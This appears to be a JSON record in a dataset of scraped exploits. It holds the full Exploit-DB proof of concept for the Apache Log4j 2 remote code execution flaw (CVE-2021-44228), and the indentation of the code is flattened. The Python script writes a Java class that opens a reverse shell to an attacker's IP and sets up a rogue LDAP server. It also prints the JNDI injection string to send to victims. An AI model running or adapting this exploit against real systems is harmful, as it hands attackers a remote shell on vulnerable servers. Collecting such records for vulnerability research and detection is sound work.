@@ -1,0 +1,23 @@
+{
+  "requisicao": "GET /api/documento/38165",
+  "status": 200,
+  "resposta": {
+    "id": 38165,
+    "url": "https://www.exploit-db.com/exploits/50592",
+    "site": "www.exploit-db.com",
+    "nome_site": "Exploit Database",
+    "titulo": "Apache Log4j 2 - Remote Code Execution (RCE)",
+    "descricao": "",
+    "palavras_chave": "Java,remote,CVE-2021-44228",
+    "texto": "Apache Log4j 2 - Remote Code Execution (RCE)\nEDB-ID:\n50592\nCVE:\n2021-44228\nEDB Verified:\nAuthor:\nkozmer\nType:\nremote\nExploit:\n/\nPlatform:\nJava\nDate:\n2021-12-14\nVulnerable App:\nTags:\nAdvisory/Source:\nLink",
+    "codigo": "# Exploit Title: Apache Log4j 2 - Remote Code Execution (RCE)\n# Date: 11/12/2021\n# Exploit Authors: kozmer, z9fr, svmorris\n# Vendor Homepage: https://logging.apache.org/log4j/2.x/\n# Software Link: https://github.com/apache/logging-log4j2\n# Version: versions 2.0-beta-9 and 2.14.1.\n# Tested on: Linux\n# CVE: CVE-2021-44228\n# Github repo: https://github.com/kozmer/log4j-shell-poc\n\nimport subprocess\nimport sys\nimport argparse\nfrom colorama import Fore, init\nimport subprocess\nimport threading\n\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\n\ninit(autoreset=True)\n\ndef listToString(s):\nstr1 = \"\"\ntry:\nfor ele in s:\nstr1 += ele\nreturn str1\nexcept Exception as ex:\nparser.print_help()\nsys.exit()\n\ndef payload(userip , webport , lport):\n\ngenExploit = (\n\"\"\"\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class Exploit {\n\npublic Exploit() throws Exception {\nString host=\"%s\";\nint port=%s;\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()) {\nwhile(pi.available()>0)\nso.write(pi.read());\nwhile(pe.available()>0)\nso.write(pe.read());\nwhile(si.available()>0)\npo.write(si.read());\nso.flush();\npo.flush();\nThread.sleep(50);\ntry {\np.exitValue();\nbreak;\n}\ncatch (Exception e){\n}\n};\np.destroy();\ns.close();\n}\n}\n\"\"\") % (userip, lport)\n\n# writing the exploit to Exploit.java file\n\ntry:\nf = open(\"Exploit.java\", \"w\")\nf.write(genExploit)\nf.close()\nprint(Fore.GREEN + '[+] Exploit java class created success')\n\nexcept Exception as e:\nprint(Fore.RED + f'[-] Something went wrong {e.toString()}')\n\ncheckJavaAvailible()\nprint(Fore.GREEN + '[+] Setting up fake LDAP server\\n')\n\n# create the LDAP server on new thread\nt1 = threading.Thread(target=createLdapServer, args=(userip,webport))\nt1.start()\n\n# start the web server\n\nhttpd = HTTPServer(('localhost', int(webport)), SimpleHTTPRequestHandler)\nhttpd.serve_forever()\n\ndef checkJavaAvailible():\njavaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)\nif(javaver != 0):\nprint(Fore.RED + '[-] Java is not installed inside the repository ')\nsys.exit()\n\ndef createLdapServer(userip, lport):\nsendme = (\"${jndi:ldap://%s:1389/a}\") % (userip)\nprint(Fore.GREEN +\"[+] Send me: \"+sendme+\"\\n\")\n\nsubprocess.run([\"./jdk1.8.0_20/bin/javac\", \"Exploit.java\"])\n\nurl = \"\nhttp://{}:{}/#Exploit\".format\n(userip, lport)\nsubprocess.run([\"./jdk1.8.0_20/bin/java\", \"-cp\",\n\"target/marshalsec-0.0.3-SNAPSHOT-all.jar\", \"marshalsec.jndi.LDAPRefServer\", url])\n\ndef header():\nprint(Fore.BLUE+\"\"\"\n[!] CVE: CVE-2021-44228\n[!] Github repo:\nhttps://github.com/kozmer/log4j-shell-poc\n\"\"\")\n\nif __name__ == \"__main__\":\nheader()\n\ntry:\nparser = argparse.ArgumentParser(description='please enter the values ')\n\nparser.add_argument('--userip', metavar='userip', type=str,\nnargs='+', help='Enter IP for LDAPRefServer & Shell')\n\nparser.add_argument('--webport', metavar='webport', type=str,\nnargs='+', help='listener port for HTTP port')\n\nparser.add_argument('--lport', metavar='lport', type=str,\nnargs='+', help='Netcat Port')\n\nargs = parser.parse_args()\n\n#print(args.userip)\n\npayload(listToString(args.userip), listToString(args.webport), listToString(args.lport))\n\nexcept KeyboardInterrupt:\nprint(Fore.RED + \"user interupted the program.\")\nsys.exit(0)\n            ",
+    "codigo_truncado": false,
+    "tamanho_codigo": 3532,
+    "cves": [
+      "CVE-2021-44228"
+    ],
+    "cwes": [],
+    "n_termos_texto": 41,
+    "n_termos_codigo": 439
+  }
+}
